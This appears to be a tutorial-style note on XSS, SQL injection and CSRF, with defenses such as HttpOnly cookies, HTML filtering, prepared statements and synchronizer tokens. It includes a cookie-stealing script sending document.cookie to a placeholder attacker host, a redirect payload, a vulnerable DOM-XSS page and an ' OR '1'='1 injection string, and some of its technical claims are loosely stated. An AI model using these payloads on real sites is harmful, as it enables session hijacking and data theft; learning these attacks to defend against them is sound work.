#Cross-Site Scripting:

It is a type of vulnerability in which there is no proper input validation happening at client side which leads to injecting malicious script to web server which is reflected off from the server also called as reflected XSS. There can be other types of XSS attacks.

In stored XSS the malicous script being sent from browser to server gets stored in the database as part of the request and then the attacker can retrieve back those malicious scripts from the web server which is highly vulnerable.

##Types of XSS:
Cross site scritping can be classifed into 3 major categories as listed below:
* Stored/persistence XSS
* Reflected XSS
* Dom based XSS

###Stored XSS:

It is also called as persistence XSS which is considered to be very harmful XSS vulnerability. This involves attacker injecting malicious javascript code in the application which results in storing of those scripts at web server database end. Whenever any other other tries to access data in the same application then the user gets stored malicious script by querying database which is highly vulnerable.

###Reflected XSS:

In this XSS vulnearbility the javascript injected to the application gets reflected back and gets executed in the victims browser hence revealing crucial information(session cookie) to the attacker. It is not considered to be highly vulnearble XSS type.

###DOM based XSS:

It is an advanced and most vulnerable type of XSS attack in which web applications client side scripts write user provided data to Document Object Model(DOM) and then this data is read fro the DOM by the web application and outputted to browser. If this data is not handled properly then attacker can inject maliciuos payload which gets stored as DOM and gets executed when data is read from DOM. It becomes highly vunerable for the web application and also web application firewall and security can not find anything in the server log. 
Various object models which can be used to inject malicious payload are document.URL ,document.referrer ,document.location 

###Example of DOM based XSS attack :

```
<html>
<head>
<title>My Dashboard Demo</title>
...
</head>
Main Dashboard for
<script>
    var pos=document.URL.indexOf("context=");
    document.write(document.URL.substring(pos,document.URL.length));
</script>
...
</html>

```

##Primary Defenses:
* Input Validation
* Output encoding

##Impact: 
Session hijacking, full control of page, malicious redirects

##Problem:
User controlled data returned in HTTP response contains Javascript code.

Below fig illustrates how simple XSS attack work:

[here] http://www.acunetix.com/wp-content/uploads/2012/10/how-xss-works-910x404.png

##Example:

```
Cookie theft example
<script>document.location="http://evilwebsite.com"+document.cookie</script>
```

In the above URL the attacker can retrieve session cookie from the URL by parsing the URL.
It usually uses Javascript to do bad things like :

* Steal session cookies 

```
<script>alert(document.cookie)</script>
```
* Redirect to bad pages
<script>window.location="http://evilwebsite.com"</script>

* Rewrite page on the fly

##The main areas which needs to be sanitized before using in website are :

* The URL
* HTTP referrer objects
* GET parameters from a form
* POST parameters from a form
* Window.location
* Document.referrer
* document.location
* document.URL
* document.URLUnencoded
* cookie data
* headers data
* database data, if not properly validated on user input

##Sample code to prevent XSS:
There are several ways of mitigating XSS attack in web appplicaitons.Some of them are listed below:
* Use of HttpOnly flag - It is an additional flag included in a HTTP response header.This flag helps in reducing the risk of accessing the protected cookie at client side by the attacker (only if browser supports it).
* Also we can add below code in the server side program to prevent persistent XSS attack

###Example:

```
Cookie cookie = getMyCookie("myCookieName");
cookie.setHttpOnly(true);
```
* Configuration level changes can also prevent XSS attack by applying the following configuration in the deployment descriptor WEB-INF/web.xml:

```
<session-config>
 <cookie-config>
  <http-only>true</http-only>
 </cookie-config>
</session-config>
```

* Some web application servers( i,e Tomcat), that implements JEE 5, and servlet container that implements Java Servlet 2.5 (part of the JEE 5), also allow creating HttpOnly session cookies .Below "useHttpOnly" attribute needs to be added in Context tag of context.xml file of Tomcat web server.
```

<?xml version="1.0" encoding="UTF-8"?>
<Context path="/myWebApplicationPath" useHttpOnly="true">
```

* HTMLfilter class can also be used in java web applicaitons for preventing XSS attack as show below
```
 // retrieve input from user
String input = ...
String clean = new HTMLInputFilter().filter( input );   
```
The HTMLFilter class needs to be added in pom.xml file of the Maven built project
```
 <dependency>
   <groupId>net.sf.xss-html-filter</groupId>
   <artifactId>xss-html-filter</artifactId>
   <version>1.1</version> 
 </dependency>

 <repository>
   <id>xss-html-filter releases</id>
   <name>xss-html-filter Releases Repository</name>
   <url>http://xss-html-filter.sf.net/releases/</url>
 </repository>

```

#SQL Injection

The best way to find out if an application is vulnerable to SQL injection is to remove dynamic queries from the Application code.
we need to use bind variables in all prepared statement in the code and avoid dynamic queries.

##Primary Defenses:

* Use of Prepared Statements (Parameterized Queries)
* Use of Stored Procedures
* Escaping all User Supplied Input

##Problem:

 User controlled data is improperly used with SQL statements.

##Impact:
 Arbitrary SQL Execution, Data corruption ,Data theft.

##Example :
Any unparameterised or dynamic query can lead to SQL injection attack in web applicaitons


##Sample Demo:
Consider creating a users table and inserting of sample data into that table

###Creation of table :
```
create table users(user_id int, first_name varchar2(50),last_name varchar2(50),password varchar(50));
```
###Insertion of sample data:

```
insert into users values(101, 'Susan' ,'Dhoni' ,'***');
insert into users values(101, 'Nisha' ,'Malhotra' ,'***');
insert into users values(101, 'Niraj' ,'Dholakia' ,'***');
insert into users values(101, 'Vikas' ,'Sharma' ,'***');

```

SQL Injection attack:

``` 
select * from users where last_name=Malhotra' OR '1'='1;
```
###Result:

All the records from the table users gets displayed.


#Cross site request forgery

It is a web application threat in which an attacker can cause a victim to execute almost any unknow or undesired request which is harmful.

##Steps of how CSRF attack works:

* Victim is tempted by the attacker to visit an evil website.
* Victim's browser loads the evil website which internally contains a hidden image whose source points to important transaction(on good website)
* Thus victim unknowingly executes that important transaction on good website and passes along his session cookie to others (i,e attacker) 


##Basic flow of using Synchronizer Token Pattern solution for preventing CSRF attack:

* Per session token (also known as synchronizer token design pattern) can be used as the solution for the above attack. When user logs into a website, a token is placed in the user session.
* On any request that changes the server side state , this token is placed in the form when it is submitted.
* Request handler matches the token present in the form with the token in the user's seesion, if the token is missing or if they do not match then the transaction will not be performed.

##Example of CSRF attacks :
Illegal  Funds Transfer, form submission,Changing password etc.

###Solution
Using Synchronized Token Pattern 
```
<form action="/transfer.do" method="post">
  <input type="hidden" name="CSRFToken" value="OWY4NmQwODE4OdsfdDRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">
   ..
</form>
```
In this we make use of hidden fields to store CSRFtoken which has a common name as 'CSRFToken'. This CSRF token is generated using java.security.SecureRandom class which generates significantly long random token. Whenever user logs into the web application,this CSRFToken is attached to user's session alongwith the form and submits a non-imdempotent request to the web server then at server end the request handler matches these two tokens, one present in the session of the user and other in the request , if these tokens doesnot match then transaction will not be performed. Thus preventing Cross site request forgery attack to occur.


